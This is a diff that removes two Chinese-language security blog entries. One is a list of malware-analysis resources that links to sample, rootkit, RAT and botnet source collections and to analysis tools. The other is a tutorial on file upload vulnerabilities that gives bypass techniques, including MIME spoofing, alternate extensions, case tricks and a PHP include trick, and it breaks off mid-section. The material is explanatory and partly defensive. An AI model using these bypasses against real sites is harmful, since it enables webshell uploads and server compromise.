@@ -714,271 +714,6 @@ msf auxiliary(arp_sweep) &gt; run
       </tags>
   </entry>
   <entry>
-    <title>恶意软件分析资源</title>
-    <url>/posts/12996/</url>
-    <content><![CDATA[<center>本文汇总恶意软件分析中样本来源、分析工具、技术网站等资源...</center>
-
-<span id="more"></span>
-
-<h2 id="0x01-样本来源"><a href="#0x01-样本来源" class="headerlink" title="0x01 样本来源"></a>0x01 样本来源</h2><h3 id="1-下载网站"><a href="#1-下载网站" class="headerlink" title="1. 下载网站"></a>1. 下载网站</h3><ul>
-<li><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a> 微步云沙箱</li>
-<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> 在线样本获取</li>
-<li><a href="https://app.any.run/">https://app.any.run/</a> 在线样本分析</li>
-<li><a href="https://bazaar.abuse.ch/browse/">https://bazaar.abuse.ch/browse/</a>  MalwareBazaar Database</li>
-<li><a href="https://vx-underground.org/samples.html">https://vx-underground.org/samples.html</a> 恶意软件在线下载</li>
-<li><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a>  恶意软件分析开源项目</li>
-<li><a href="https://objective-see.com/malware.html">https://objective-see.com/malware.html</a> MacOS恶意软件样本</li>
-<li><a href="http://contagiodump.blogspot.com/">http://contagiodump.blogspot.com/</a> Contagio恶意软件收集平台</li>
-<li><a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a>  Payload Security恶意软件分析</li>
-<li><a href="http://vxvault.net/ViriList.php">http://vxvault.net/ViriList.php</a>  该网站为恶意软件和urls的收集</li>
-</ul>
-<h3 id="2-分类样本"><a href="#2-分类样本" class="headerlink" title="2. 分类样本"></a>2. 分类样本</h3><ul>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>  Payloads合集</li>
-<li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>  Exploit 和 shellcode 样本</li>
-<li><a href="https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/pubhtml">https://docs.google.com/spreadsheets/</a> 勒索软件列表</li>
-<li><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a>  Webshell资源</li>
-<li><a href="https://github.com/milabs/awesome-linux-rootkits">https://github.com/milabs/awesome-linux-rootkits</a> Linux rootkit合集</li>
-<li><a href="https://github.com/d30sa1/RootKits-List-Download">https://github.com/d30sa1/RootKits-List-Download</a>  Rootkit下载列表</li>
-<li><a href="https://github.com/alphaSeclab/awesome-rat">https://github.com/alphaSeclab/awesome-rat</a>  远控木马合集</li>
-<li><a href="https://github.com/maestron/botnets">https://github.com/maestron/botnets</a> Botnet源码合集</li>
-</ul>
-<h3 id="3-样本合集"><a href="#3-样本合集" class="headerlink" title="3. 样本合集"></a>3. 样本合集</h3><ul>
-<li><a href="https://github.com/vxunderground/MalwareSourceCode">https://github.com/vxunderground/MalwareSourceCode</a>  不同平台不同语言恶意软件源码</li>
-<li><a href="https://github.com/InQuest/malware-samples">https://github.com/InQuest/malware-samples</a> 恶意软件样本与分析文章集合</li>
-<li><a href="https://github.com/RamadhanAmizudin/malware">https://github.com/RamadhanAmizudin/malware</a> Malwaretech恶意样本集</li>
-<li><a href="https://github.com/mstfknn/malware-sample-library">https://github.com/mstfknn/malware-sample-library</a> 恶意软件样本库</li>
-<li><a href="https://github.com/ashishb/android-malware">https://github.com/ashishb/android-malware</a> Andorid恶意样本库</li>
-</ul>
-<h2 id="0x02-分析工具"><a href="#0x02-分析工具" class="headerlink" title="0x02 分析工具"></a>0x02 分析工具</h2><h3 id="1-Linux平台"><a href="#1-Linux平台" class="headerlink" title="1. Linux平台"></a>1. Linux平台</h3><h4 id="a-静态分析"><a href="#a-静态分析" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
-<li><a href="https://linux.die.net/man/1/file">file</a> – 显示文件的类型</li>
-<li><a href="https://linux.die.net/man/1/strings">strings</a>– 从文件中提取字符串</li>
-<li><a href="http://man7.org/linux/man-pages/man1/diff.1.html">diff</a> – 区分文件</li>
-<li><a href="https://linux.die.net/man/1/nm">nm</a> – 提取符号表（函数导入、导出）</li>
-<li><a href="https://linux.die.net/man/1/strace">strace</a> – 跟踪系统调用和信号</li>
-<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符（推荐）</li>
-</ul>
-<h4 id="b-动态分析"><a href="#b-动态分析" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
-<li><a href="https://www.wireshark.org/download.html">Wireshark</a> – 网络分析工具</li>
-<li><a href="https://linux.die.net/man/8/tcpdump">tcpdump</a>  – 网络分析工具</li>
-<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> –一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理</li>
-<li><a href="https://www.netresec.com/?page=Blog&month=2014-02&post=HowTo-install-NetworkMiner-in-Ubuntu-Fedora-and-Arch-Linux">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
-<li><a href="https://portswigger.net/burp/communitydownload">Burp Suite</a> – 适用于任何浏览器、系统或平台的免费网络代理</li>
-<li><a href="https://www.inetsim.org/packages.html">INetSim</a> – 互联网服务模拟套件</li>
-</ul>
-<p>适用于 Linux 的 Procmon</p>
-<h4 id="c-逆向工具"><a href="#c-逆向工具" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
-<li><a href="https://linux.die.net/man/1/gdb">GDB</a> – GNU 调试器</li>
-<li><a href="https://www.hex-rays.com/products/ida/support/download.shtml">IDA Free&#x2F;Pro</a> – 反汇编器和调试器</li>
-<li><a href="https://www.hopperapp.com/">Hopper</a> – 反汇编器和调试器</li>
-<li><a href="https://rada.re/r/">radare2</a> - 免费和开源的反汇编器和调试器</li>
-<li><a href="https://github.com/radareorg/cutter">Cutter</a> -radare2 的 GUI</li>
-<li><a href="https://binary.ninja/">Binary Ninja</a> – 一种新型的逆向平台</li>
-<li><a href="https://github.com/angr/angr">angr</a> – 跨平台二进制分析框架</li>
-</ul>
-<h4 id="d-脱壳反混淆"><a href="#d-脱壳反混淆" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
-<li><a href="https://github.com/fireeye/flare-floss">FLOSS</a> – 自动从恶意软件中提取混淆的字符串</li>
-<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
-<li><a href="https://blog.didierstevens.com/programs/xorsearch/">XorSearch</a> -用于在 XOR、ROL、ROT 或 SHIFT 编码的二进制文件中搜索给定字符串</li>
-</ul>
-<h4 id="e-取证工具"><a href="#e-取证工具" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
-<li><a href="http://man7.org/linux/man-pages/man1/dd.1.html">dd</a> – 硬盘取证获取工具</li>
-<li><a href="http://www.sleuthkit.org/autopsy/download.php">Autopsy</a> - 硬盘取证分析工具</li>
-<li><a href="https://github.com/504ensicsLabs/LiME">LiME</a> – 内存获取工具</li>
-<li><a href="https://github.com/volatilityfoundation/volatility">Volatility</a> – 内存取证分析框架</li>
-<li><a href="https://fogproject.org/">FOG</a> — 免费的开源网络计算机克隆和管理解决方案</li>
-</ul>
-<h4 id="f-综合工具"><a href="#f-综合工具" class="headerlink" title="f. 综合工具"></a>f. 综合工具</h4><ul>
-<li><a href="https://github.com/monnappa22/Limon">Limon Sandbox</a> – 免费开源的自动化 Linux 恶意软件分析沙箱</li>
-<li><a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a> – 免费开源的自动化恶意软件分析沙箱</li>
-</ul>
-<h3 id="2-Windwos平台"><a href="#2-Windwos平台" class="headerlink" title="2. Windwos平台"></a>2. Windwos平台</h3><h4 id="a-静态分析-1"><a href="#a-静态分析-1" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
-<li><a href="https://mh-nexus.de/en/downloads.php?product=HxD20">HxD</a> – 十六进制查看器和编辑器</li>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/">strings</a> – 从文件中提取字符串</li>
-<li><a href="https://www.nirsoft.net/utils/hash_my_files.html">HashMyFiles</a> – 计算文件的 MD5&#x2F;SHA1&#x2F;CRC32 哈希值</li>
-<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符</li>
-<li><a href="https://www.aldeid.com/wiki/PEiD">PEiD</a> – 封隔器标识符</li>
-<li><a href="https://www.winitor.com/">PeStudio</a> – 高级 PE 查看器等</li>
-<li><a href="https://ntcore.com/?page_id=388">CFF Explorer</a> – PE 编辑器</li>
-<li><a href="http://www.angusj.com/resourcehacker/">Resource Hacker</a> – 资源编辑器</li>
-<li><a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> – OLE 文件分析器</li>
-<li><a href="http://www.reconstructer.org/">OfficeMalScanner</a> – Office 文件恶意软件扫描程序</li>
-<li><a href="https://blog.didierstevens.com/2009/03/31/pdfid/">PDFiD</a> – PDF 字符串扫描仪和标识符</li>
-<li><a href="http://sandsprite.com/blogs/index.php?uid=7&pid=57">PDFStreamDumper</a> – PDF 恶意文件扫描程序</li>
-<li><a href="https://github.com/smalot/pdfparser">PDFParser</a> – PDF 文件数据提取器</li>
-</ul>
-<h4 id="b-动态分析-1"><a href="#b-动态分析-1" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Explorer</a> - 高级任务管理器</li>
-<li><a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker</a> - 高级任务管理器</li>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Monitor</a> – 监控系统进程事件（文件系统、注册表、网络）</li>
-<li><a href="https://sourceforge.net/projects/regshot/">Regshot</a> – 注册表比较程序</li>
-<li><a href="http://www.rohitab.com/downloads">API Monitor</a> – 监视 Windows API 函数（内存转储、断点等）</li>
-<li><a href="https://github.com/hasherezade/pe-sieve">PE-Sieve</a> – 扫描恶意植入（替换&#x2F;注入 PE、shellcode、钩子、内存补丁）</li>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/">TCPView</a> – 显示网络连接</li>
-<li><a href="https://www.telerik.com/fiddler">Fiddler</a> – 适用于任何浏览器、系统或平台的免费Web调试代理</li>
-<li><a href="https://github.com/fireeye/flare-fakenet-ng">FakeNet-NG</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
-<li><a href="https://www.inetsim.org/downloads.html">INetSim</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
-<li><a href="https://www.fireeye.com/services/freeware/apatedns.html">ApateDNS</a> – 控制 DNS 响应</li>
-<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> – 一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理（非常适合 HTTPS 检查）</li>
-<li><a href="https://www.netresec.com/index.ashx?page=NetworkMiner">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
-<li><a href="https://www.procdot.com/">ProcDot</a> – 一种新的可视化恶意软件分析工具</li>
-<li><a href="https://www.phrozen.io/docs/windows/projects/freeware/winja/">WinJa</a> – 一个轻量级但功能强大的工具，用于发现隐藏在您系统中的恶意软件</li>
-<li><a href="https://www.kahusecurity.com/tools.html">CMD Watcher</a> – 监视 CMD、PowerShell 和其他进程，暂停它，提取命令行数据，然后有选择地杀死它</li>
-</ul>
-<h4 id="c-逆向工具-1"><a href="#c-逆向工具-1" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
-<li><a href="https://x64dbg.com/">x64dbg</a> – 用户模式调试器</li>
-<li><a href="http://www.ollydbg.de/version2.html">OllyDbg</a> – 用户模式调试器</li>
-<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a> – 内核模式调试器</li>
-<li><a href="https://github.com/SinaKarvandi/windbg2ida">WinDBG2IDA</a> — 显示 IDA 中的 WinDBG 步骤</li>
-<li><a href="https://github.com/avast/retdec">RetDec</a> – 基于 LLVM 的可重定向机器代码反编译器</li>
-<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> – NSA 软件逆向工程框架</li>
-</ul>
-<h4 id="d-脱壳反混淆-1"><a href="#d-脱壳反混淆-1" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
-<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
-<li><a href="https://github.com/BromiumLabs/PackerAttacker">PackerAttacker</a> – 使用内存和代码挂钩来检测加壳程序的 C++ 应用程序</li>
-<li><a href="https://github.com/unipacker/unipacker">UniPacker</a> – 基于仿真的 Windows 二进制文件的自动和平台独立解包器</li>
-<li><a href="https://github.com/malwaremusings/unpacker/">unpacker</a> - WinAppDbg脚本来自动执行恶意拆包</li>
-</ul>
-<h4 id="e-加壳工具"><a href="#e-加壳工具" class="headerlink" title="e. 加壳工具"></a>e. 加壳工具</h4><ul>
-<li><a href="https://upx.github.io/">UPX</a> – Windows PE Packer</li>
-<li><a href="https://www.alternate-tools.com/pages/c_exepacker.php?lang=ENG">Alterante EXE Packer</a> – 基于 UPX打包程序</li>
-<li><a href="https://enigmaprotector.com/">Enigma Protector</a> – 用于许可和保护Windows 可执行文件的专业系统</li>
-<li><a href="https://www.webtoolmaster.com/exestealth.htm">ExeStealth</a> – Delphi、Visual Basic 和 C++ PE打包程序</li>
-<li><a href="https://www.oreans.com/Themida.php">Themida</a> - 高级Windows 软件保护系统</li>
-<li><a href="https://vmpsoft.com/">VMProtect</a> – VMProtect 通过在具有非标准架构的虚拟机上执行代码来保护代码</li>
-</ul>
-<h4 id="f-取证工具"><a href="#f-取证工具" class="headerlink" title="f. 取证工具"></a>f. 取证工具</h4><ul>
-<li><a href="https://winpmem.velocidex.com/">WinPmem</a> – 内存取证获取工具</li>
-<li><a href="https://blog.comae.io/your-favorite-memory-toolkit-is-back-f97072d33d5c">DumpIt</a> – 内存取证获取工具</li>
-<li><a href="https://accessdata.com/product-download/ftk-imager-version-4-2-0">FTK Imager</a> – 硬盘和内存取证获取工具</li>
-<li><a href="https://github.com/google/rekall">Rekall</a> – 内存取证框架</li>
-<li><a href="https://www.fireeye.com/services/freeware/redline.html">Readline</a> - 内存取证分析工具</li>
-</ul>
-<h4 id="g-综合工具"><a href="#g-综合工具" class="headerlink" title="g. 综合工具"></a>g. 综合工具</h4><ul>
-<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Sysinternals Suite</a> – Microsoft 用于分析 Windows 系统内部的工具</li>
-<li><a href="https://github.com/fireeye/flare-vm">Flare-VM</a> – 基于 Windows 的恶意软件分析安全工具</li>
-</ul>
-<h3 id="3-MacOS平台"><a href="#3-MacOS平台" class="headerlink" title="3. MacOS平台"></a>3. MacOS平台</h3><h4 id="a-静态分析-2"><a href="#a-静态分析-2" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
-<li><a href="https://www.unix.com/man-page/osx/1/codesign/">codesign</a>  – 提取代码签名认证状态等</li>
-<li><a href="https://www.unix.com/man-page/osx/8/spctl/">spctl</a> – 检查文件的认证是否被撤销等等</li>
-<li><a href="https://www.unix.com/man-page/osx/1/xattr/">xattr</a> – 检查属性文件是否包含以及包含哪些属性（例如 GateKeeper 检查的隔离标志）</li>
-<li><a href="https://www.unix.com/man-page/osx/1/otool/">otool</a> – 检查二进制文件、提取汇编指令、查看段、节等</li>
-<li><a href="http://www.newosxbook.com/tools/jtool.html">JTool</a> – otool的升级本工具</li>
-<li><a href="https://objective-see.com/products.html">What’s your Sign</a> – 检查代码签名认证状态，显示哈希值等</li>
-</ul>
-<h4 id="b-动态分析-2"><a href="#b-动态分析-2" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
-<li><a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a> – 监控流程活动</li>
-<li><a href="https://objective-see.com/products/utilities.html#FileMonitor">FileMonitor</a> – 监控文件系统事件</li>
-<li><a href="https://github.com/dpnishant/appmon">AppMon</a> – 基于 Frida 的监控和篡改系统 API 调用的自动化框架</li>
-<li><a href="https://fsmonitor.com/">FSMonitor</a> – 监控文件系统事件（读、写等）</li>
-<li><a href="https://objective-see.com/products.html">Netiquette</a> – 监控网络连接</li>
-<li><a href="https://objective-see.com/products.html">LuLu</a> – 检查网络可疑活动并显示</li>
-<li><a href="https://objective-see.com/products.html">TaskExplorer</a> –虚拟探索所有正在运行的进程</li>
-<li><a href="https://objective-see.com/products.html">ReiKey</a> – 动态拦截和检测键盘记录活动</li>
-<li><a href="https://objective-see.com/products.html">BlockBlock</a> – 动态拦截系统上的持久操作</li>
-</ul>
-<h4 id="c-逆向工具-2"><a href="#c-逆向工具-2" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
-<li><a href="https://lldb.llvm.org/">LLDB</a> – 类似 GDB 的 macOS 调试器</li>
-</ul>
-<h4 id="d-打包加壳"><a href="#d-打包加壳" class="headerlink" title="d. 打包加壳"></a>d. 打包加壳</h4><ul>
-<li><a href="https://www.pouet.net/prod.php?which=29185">iPakk</a> – MacOSX Mach-O (PPC)打包程序</li>
-<li><a href="https://www.pouet.net/prod.php?which=51324">muncho</a> – MacOSX Mach-O（英特尔）打包程序</li>
-<li><a href="https://www.pouet.net/prod.php?which=66926">oneKpaq</a> – MacOSX Mach-O (Intel)打包程序</li>
-</ul>
-<h4 id="e-取证工具-1"><a href="#e-取证工具-1" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
-<li><a href="http://macappstore.org/dcfldd/">dcfldd</a> – 硬盘取证获取工具</li>
-<li><a href="https://github.com/ydkhatri/mac_apt">mac_apt</a> – 硬盘取证分析工具</li>
-<li><a href="https://github.com/wrmsr/pmem/tree/master/OSXPMem">OSXPMem</a> – 内存取证获取工具</li>
-</ul>
-<h4 id="f-其他工具"><a href="#f-其他工具" class="headerlink" title="f. 其他工具"></a>f. 其他工具</h4><ul>
-<li><a href="https://objective-see.com/products.html">KnockKnock</a> – 扫描持久性对象并将它们上传到 VirusTotal</li>
-<li><a href="https://objective-see.com/products.html">KextViewr</a> – 显示所有已加载的 kext，以及它们的签名状态、完整路径、VirusTotal 检测率等</li>
-<li><a href="https://objective-see.com/products.html">Dylib Hijack Scanner</a> – 扫描系统周围潜在的 Dylib-Hijackable 应用程序</li>
-</ul>
-<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
-<li><a href="https://malwareanalysis.co/">https://malwareanalysis.co/</a></li>
-<li><a href="https://github.com/rshipp/awesome-malware-analysis">https://github.com/rshipp/awesome-malware-analysis</a></li>
-<li><a href="https://zeltser.com/malicious-software/">https://zeltser.com/malicious-software/</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>样本分析</category>
-      </categories>
-      <tags>
-        <tag>Malware Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞详解</title>
-    <url>/posts/50059/</url>
-    <content><![CDATA[<center>本文记录文件上传漏洞原理、产生原因、绕过姿势及防御方法</center>
-
-<span id="more"></span>
-<hr>
-<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><pre><code>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力，代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验
-
-这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等，这种攻击方式是最为直接和有效的，是getshell最快最直接的方法之一
-</code></pre>
-<h2 id="0x02-威胁场景"><a href="#0x02-威胁场景" class="headerlink" title="0x02 威胁场景"></a>0x02 威胁场景</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传文件是Web脚本语言，Web服务器解释并执行了用户上传的脚本，导致代码执行</span><br><span class="line"></span><br><span class="line">(2) 上传文件是病毒或者木马时，可用于诱骗用户或者管理员下载执行或者直接自动运行</span><br><span class="line"></span><br><span class="line">(3) 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为</span><br><span class="line"></span><br><span class="line">(4) 上传文件是钓鱼图片或包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈</span><br><span class="line"></span><br><span class="line">(5) 上传一个合法的文本文件，其内容包含了PHP脚本，再通过&quot;本地文件包含漏洞(Local  File  Include)&quot;执行此脚本</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-触发条件"><a href="#0x03-触发条件" class="headerlink" title="0x03 触发条件"></a>0x03 触发条件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传的文件能够被Web容器解释执行，文件上传后所在的目录需是Web容器所覆盖到的路径</span><br><span class="line"></span><br><span class="line">(2) 上传的文件能够从Web上访问</span><br><span class="line"></span><br><span class="line">(3) 上传的文件未被安全检查、格式化、图片压缩等功能改变内容</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-漏洞成因"><a href="#0x04-漏洞成因" class="headerlink" title="0x04 漏洞成因"></a>0x04 漏洞成因</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.服务器配置不当</span><br><span class="line"></span><br><span class="line">2.开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">3.本地文件上传限制被绕过</span><br><span class="line"></span><br><span class="line">4.过滤不严或被绕过</span><br><span class="line"></span><br><span class="line">5.文件解析漏洞导致文件执行</span><br><span class="line"></span><br><span class="line">6.文件路径截断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-漏洞原理"><a href="#0x05-漏洞原理" class="headerlink" title="0x05 漏洞原理"></a>0x05 漏洞原理</h2><pre><code>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本
-
-当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，用于getshell。根据具体漏洞的差异，上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本
-</code></pre>
-<h2 id="0x06-检测防御"><a href="#0x06-检测防御" class="headerlink" title="0x06 检测防御"></a>0x06 检测防御</h2><p>当一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据，针对文件上传过程检测校验措施如下</p>
-<h3 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1. 客户端校验"></a>1. 客户端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过javascript来校验上传文件的后缀是否合法，可以采用白名单/黑名单的方式；在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2. 服务端校验"></a>2. 服务端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 文件头content-type字段校验（image/gif）</span><br><span class="line"></span><br><span class="line">2) 文件内容头校验，通过正则匹配来判断文件幻数(文件头)内容是否符合要求，常见的文件头（文件头标志位）如下:</span><br><span class="line"></span><br><span class="line">  a) .JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</span><br><span class="line"></span><br><span class="line">  b）.gif，”GIF89A”（474946383961）</span><br><span class="line"></span><br><span class="line">  c）.zip，”ZipCompressed”（504B0304）</span><br><span class="line"></span><br><span class="line">  d）.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1</span><br><span class="line"></span><br><span class="line">3）目录路经检测（检测跟Path参数相关的内容）</span><br><span class="line"></span><br><span class="line">4）文件扩展名检测(检测跟文件extension 相关的内容)</span><br><span class="line"></span><br><span class="line">5）后缀名黑名单校验</span><br><span class="line"></span><br><span class="line">6）后缀名白名单校验</span><br><span class="line"></span><br><span class="line">7）自定义正则校验</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-WAF校验"><a href="#3-WAF校验" class="headerlink" title="3. WAF校验"></a>3. WAF校验</h3><p>使用不同的WAF产品来进行过滤，通常是独立于服务程序的一段中间程序或者硬件</p>
-<h2 id="0x07-绕过姿势"><a href="#0x07-绕过姿势" class="headerlink" title="0x07 绕过姿势"></a>0x07 绕过姿势</h2><h3 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1. 客户端绕过"></a>1. 客户端绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过火狐插件NOscript插件或者禁用IE中JS脚本</span><br><span class="line"></span><br><span class="line">2. 通过firbug插件元素审核修改代码（如删除onsubm:t=”return checkFile()”事件）</span><br><span class="line"></span><br><span class="line">3. 通过firbug元素审核javascirpt脚本中添加上传文件类型</span><br><span class="line"></span><br><span class="line">4. 通过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名，请求头中的Content-Length的值也要修改</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2. 服务端绕过"></a>2. 服务端绕过</h3><p>(1) 黑名单扩展名绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 利用黑名单未包含的扩展名进行绕过：如iis6.0中的asa 和cer，</span><br><span class="line"></span><br><span class="line">2) 黑名单特殊后缀名绕过：pht, phpt, phtml, php3,php4,php5,php6，需满足http.conf中设置AddTypeapplication/x-httpd-php .php1(php的版本小于等于5.3.29以下)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）利用可能存在大小写绕过漏洞：如aSp(iis6.0中）和pHp（能在小于php5.3.39中的linux中）</span><br><span class="line"></span><br><span class="line">3）利用能被WEB容器解析的文件其他扩展名列表绕过</span><br><span class="line"></span><br><span class="line">  jsp,jspx ,jspfasp </span><br><span class="line"></span><br><span class="line">  asa cer cdx,htr,xml,html</span><br><span class="line"></span><br><span class="line">  aspx,ashx,asmx,asax,ascx</span><br></pre></td></tr></table></figure>
-
-<p>(2) 利用系统文件命名规则绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”不空格，利用此特性也可以绕过黑名单验证；apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过</span><br><span class="line"></span><br><span class="line">2）linux中当php版本小于php5.3.39，可用pHp大小写绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>(3) 服务端MIME文件类型(Content-Type)绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）MIME作用</span><br><span class="line"></span><br><span class="line">使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类，web客户端使用MIME来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式癿重要标记项</span><br><span class="line"></span><br><span class="line">2）常用文件上传类型的MIME表:</span><br><span class="line"></span><br><span class="line">  text/plain（纯文本）</span><br><span class="line">  text/html（HTML文档）</span><br><span class="line">  text/javascript（js代码）</span><br><span class="line">  application/xhtml+xml（XHTML文档）</span><br><span class="line">  image/gif（GIF图像）</span><br><span class="line">  image/jpeg（JPEG图像）</span><br><span class="line">  image/png（PNG图像）</span><br><span class="line">  video/mpeg（MPEG动画）</span><br><span class="line">  application/octet-stream（二进制数据）</span><br><span class="line">  application/pdf（PDF文档）</span><br><span class="line">  application/(编程语言) 该种语言的代码</span><br><span class="line">  application/msword（Microsoft Word文件）</span><br><span class="line">  message/rfc822（RFC 822形式）</span><br><span class="line">  multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line">  application/x-www-form-urlencoded（POST方法提交癿表单）multipart/form-data（POST提交时伴随文件上传的表单）</span><br><span class="line"></span><br><span class="line">3）绕过方法</span><br><span class="line"></span><br><span class="line">上传对文件类型做了限制，可通过burpsuit将其他类文件类型修改为如：Content-Type：image/gif和image/jpeg等运行的文件类型</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>(4) 利用文件包含漏洞绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 运行上传文件包含脚本木马和一句话木马</span><br><span class="line"></span><br><span class="line">  前提：校验规则只校验当文件后缀名为asp/php/jsp癿文件内容是否为木马</span><br><span class="line"></span><br><span class="line">  (a) 先上传一个内容为木马癿txt后缀文件，因为后缀名的关系没有检验内容；</span><br><span class="line"></span><br><span class="line">  (b) 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt; </span><br><span class="line"></span><br><span class="line">  此时，这个php文件就会去引用txt文件的内容，从而绕过校验</span><br><span class="line"></span><br><span class="line">(2) 存在本地文件包含漏洞，并可上传一句话内容马</span><br><span class="line"></span><br><span class="line">  上传一个符合条件格式的文档，文档内容为一句话木马，利用文件包含漏洞包含上传癿木马文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-白名单绕过"><a href="#3-白名单绕过" class="headerlink" title="3. 白名单绕过"></a>3. 白名单绕过</h3><p>(1) 利用web服务器解析漏洞</p>
